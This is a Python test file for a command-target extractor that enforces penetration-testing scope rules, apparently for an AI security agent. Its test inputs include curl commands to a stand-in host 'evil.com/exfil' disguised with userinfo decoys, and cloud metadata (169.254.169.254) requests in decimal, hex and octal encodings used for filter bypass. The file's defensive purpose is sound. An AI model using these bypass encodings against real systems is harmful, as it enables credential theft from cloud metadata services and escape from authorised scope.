from decepticon.middleware._command_targets import extract_targets
from decepticon_core.types.roe import MachineEnforcement, evaluate_target


def test_userinfo_decoy_yields_real_host_not_in_scope_label():
    targets = extract_targets("curl http://in-scope.acme.com@evil.com/")
    assert targets == {"evil.com"}


def test_userinfo_with_password_decoy_yields_real_host():
    targets = extract_targets("curl https://api.acme.com:tok@evil.com/exfil")
    assert targets == {"evil.com"}


def test_decimal_encoded_imds_normalized_to_dotted_quad():
    targets = extract_targets("curl http://2852039166/latest/meta-data/")
    assert "169.254.169.254" in targets


def test_hex_encoded_imds_normalized_to_dotted_quad():
    targets = extract_targets("curl http://0xa9fea9fe/latest/meta-data/")
    assert "169.254.169.254" in targets


def test_octal_encoded_imds_normalized_to_dotted_quad():
    # 0251.0376.0251.0376 == 169.254.169.254 (octal per octet). libc inet_aton
    # — what curl/wget use on the engagement host — routes it to IMDS, so the
    # canonicaliser must collapse it to the dotted quad the deny rule matches.
    targets = extract_targets("curl http://0251.0376.0251.0376/latest/meta-data/")
    assert "169.254.169.254" in targets


def test_dotted_hex_encoded_imds_normalized_to_dotted_quad():
    targets = extract_targets("curl http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/")
    assert "169.254.169.254" in targets


def test_short_octet_form_normalized_to_dotted_quad():
    # 127.1 is the classic short form for 127.0.0.1.
    assert "127.0.0.1" in extract_targets("curl http://127.1/")


def test_out_of_range_numeric_dotted_token_not_mangled_into_ip():
    # Numeric-looking but out of range: must not raise and must not be coerced
    # into a (wrong) dotted quad — it passes through as a non-IP token.
    targets = extract_targets("curl http://999.999.999.999/")
    assert not any(t.count(".") == 3 and t != "999.999.999.999" for t in targets)


def test_encoded_imds_command_refused_by_forbidden_destination_gate():
    # End-to-end: the alternate encodings must produce a target the RoE
    # forbidden-destination gate refuses in enforce mode — the bypass is closed.
    rules = MachineEnforcement.from_dict({"in_scope": ["10.0.0.0/8"]})
    for cmd in (
        "curl http://0251.0376.0251.0376/latest/meta-data/",
        "curl http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
    ):
        targets = extract_targets(cmd)
        assert "169.254.169.254" in targets
        assert any(
            evaluate_target(t, rules).reason_code == "FORBIDDEN_DESTINATION" for t in targets
        )


def test_ipv6_literal_url_host_extracted():
    targets = extract_targets("curl http://[fd00:ec2::254]/latest/meta-data/")
    assert "fd00:ec2::254" in targets


def test_compound_resolve_argument_does_not_emit_junk_token():
    targets = extract_targets(
        "curl --resolve metadata.google.internal:80:169.254.169.254 "
        "http://metadata.google.internal/"
    )
    assert "169.254.169.254" in targets
    assert "metadata.google.internal" in targets
    assert "metadata.google.internal:80:169.254.169.254" not in targets


def test_small_integer_host_not_mangled_into_ip():
    assert "0.0.31.144" not in extract_targets("curl http://8080/")


def test_plain_url_host_unchanged_regression():
    assert extract_targets("curl http://prod.acme.com/path") == {"prod.acme.com"}


def test_url_with_port_strips_port_regression():
    assert extract_targets("curl https://prod.acme.com:8443/") == {"prod.acme.com"}


def test_plain_ipv4_target_still_extracted_regression():
    assert "10.0.0.5" in extract_targets("nmap -sV 10.0.0.5")


def test_cidr_target_preserved_regression():
    assert "10.0.0.0/24" in extract_targets("nmap -sn 10.0.0.0/24")


def test_tld_colliding_hosts_not_dropped_by_extension_denylist():
    assert extract_targets("curl https://evil.zip/") == {"evil.zip"}
    assert extract_targets("curl https://target.sh/") == {"target.sh"}
    assert extract_targets("curl https://pay.md/") == {"pay.md"}
    assert extract_targets("curl https://exploit.py/") == {"exploit.py"}
    assert extract_targets("curl https://domain.pl/") == {"domain.pl"}
    assert extract_targets("curl https://docs.pub/") == {"docs.pub"}


def test_genuine_local_file_argument_still_excluded():
    assert extract_targets("nmap -oA key.pem 10.0.0.1") == {"10.0.0.1"}
    assert extract_targets("nmap -oA scan.txt 10.0.0.1") == {"10.0.0.1"}
